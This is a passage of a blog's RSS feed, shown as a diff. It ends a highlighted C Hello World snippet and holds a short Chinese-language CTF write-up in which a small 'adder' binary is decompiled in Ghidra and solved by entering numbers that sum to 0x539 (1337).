+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6"># include&amp;lt;stdio.h&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">&lt;/span>&lt;span style="color:#8be9fd">int&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> a &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">5&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> b &lt;span style="color:#ff79c6">=&lt;/span> a &lt;span style="color:#ff79c6">*&lt;/span> &lt;span style="color:#bd93f9">6&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd">int&lt;/span> c &lt;span style="color:#ff79c6">=&lt;/span> b &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#bd93f9">4&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#f1fa8c">&amp;#34;Hello World&lt;/span>&lt;span style="color:#f1fa8c">\n&lt;/span>&lt;span style="color:#f1fa8c">&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#bd93f9">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF-WriteUp】EasyCTF-adder</title><link>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2022/ctf_easyctf_adder/</guid><description>&lt;p>題目：&lt;/p>
+&lt;pre>&lt;code>給你一個加法程式，找出Flag
+&lt;/code>&lt;/pre>
+&lt;p>&lt;a href="https://ja-errorpro.codes/file/adder">adder&lt;/a>&lt;/p>
+&lt;h1 id="概念">概念：&lt;/h1>
+&lt;ul>
+&lt;li>反編譯&lt;/li>
+&lt;/ul>
+&lt;h1 id="題解">題解&lt;/h1>
+&lt;p>在linux執行程式，看到要你輸入三個數，先隨意輸入，發現輸出nope。&lt;/p>
+&lt;p>開啟反編譯工具Ghidra對檔案反編譯，發現在main函式中的flag前綴，&lt;/p>
+&lt;p>而只要讓該行上面的if條件成立應該就能得到flag，顯然我們只要輸入三個數讓他加起來等於 0x539 即可。&lt;/p>
+&lt;p>透過簡單的進位換算，得$539_{16}\ =\ 1337_{10}$&lt;/p>
+&lt;p>開啟程式輸入1337 0 0 就可以拿到flag了~&lt;/p></description></item></channel></rss>
